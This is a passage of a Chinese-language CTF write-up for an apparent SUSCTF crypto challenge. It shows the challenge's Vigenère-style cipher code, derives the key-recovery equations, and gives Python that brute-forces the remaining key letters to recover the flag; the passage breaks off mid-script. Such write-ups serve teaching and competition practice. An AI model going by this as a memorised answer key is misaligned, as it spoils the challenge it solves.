data-num=\"15\"></td><td><pre>        c <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        res <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>'''</pre></td></tr></table></figure><p><img data-src=\"image-20231013112128576.png\" alt=\"image-20231013112128576\"></p>\n<p>由上述代码可以得到以下密文 res 和明文 msg 之间的关系：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mi>s</mi><mi>g</mi><mo>+</mo><mi>k</mi><mo>−</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn><mo>+</mo><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">res = ( msg + k - 2*a) \\;mod\\; 26 + a\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span></span></p>\n<p>那么就能推导出以下内容：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>m</mi><mi>s</mi><mi>g</mi><mo>=</mo><mn>26</mn><mo>∗</mo><mi>n</mi><mo>+</mo><mo stretchy=\"false\">(</mo><mi>r</mi><mi>e</mi><mi>s</mi><mo>−</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>k</mi><mo>+</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>n</mi><mtext>为整数</mtext><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>k</mi><mo>=</mo><mn>26</mn><mo>∗</mo><mi>n</mi><mo>+</mo><mo stretchy=\"false\">(</mo><mi>r</mi><mi>e</mi><mi>s</mi><mo>−</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>m</mi><mi>s</mi><mi>g</mi><mo>+</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>n</mi><mtext>为整数</mtext><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">msg = 26 * n + (res - a ) - k + 2*a \\;\\;\\;\\;\\; (n为整数) \\\\\nk = 26 * n + (res - a ) - msg + 2*a \\;\\;\\;\\;\\; (n为整数)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">数</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7777700000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">数</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>在加密规则中可以知道，密钥 key 为 10 位均为小写字母，msg 在加密时所有字符都处理为小写。加密过程中，字符如果不是字母就直接将其放入密文中不进行任何处理；如果是字母就将其与密钥 key 对应的位数（超过 10 就 mod10）进行相加，并减去 2*a，再对 26 取余，再加 a。已知密文为： <code>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</code> ，明文应该是  <code>susctf</code>  为开头的，于是根据上述等式，可以得知 k 的前六位为  <code>qkxjuk</code></p>\n<p>剩下的四位不用求出，直接根据明文的字符都在  <code>a~f</code>  中可以对 k 进行穷举。最终得到唯一的 flag</p>\n<p>代码如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># from secret import flag, key</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># assert re.match(r\"^susctf\\&#123;[0-9a-f]&#123;8&#125;-([0-9a-f]&#123;4&#125;-)&#123;3&#125;[0-9a-f]&#123;12&#125;\\&#125;$\", flag)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># assert re.match(r\"^[a-z]&#123;10&#125;$\", key)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    key<span class=\"token punctuation\">,</span> msg <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            res <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        c <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        res <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            msg <span class=\"token operator\">+=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        m <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            msg_ <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span> <span class=\"token operator\">*</span> n <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>msg_<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token comment\"># if msg_.islower():</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                msg <span class=\"token operator\">+=</span> msg_</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> msg</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getk</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        k <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                m <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                r <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                k_ <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span><span class=\"token operator\">*</span>n <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">if</span> k_<span class=\"token punctuation\">.</span>islower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                    k <span class=\"token operator\">+=</span> k_</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># print(encrypt(flag, key))</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_string</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    random_string <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_lowercase<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">return</span> random_string</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">'ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;'</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>letters <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\"># 生成所有可能的 4 个字母组合</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>combinations <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">for</span> letter1 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">for</span> letter2 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">for</span> letter3 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">for</span> letter4 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                combination <span class=\"token operator\">=</span> letter1 <span class=\"token operator\">+</span> letter2 <span class=\"token operator\">+</span> letter3 <span class=\"token operator\">+</span> letter4</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                combinations<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>combination<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">for</span> combo <span class=\"token keyword\">in</span> combinations<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">\"qkxjuk\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>combo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token comment\"># print(key)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">38</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token 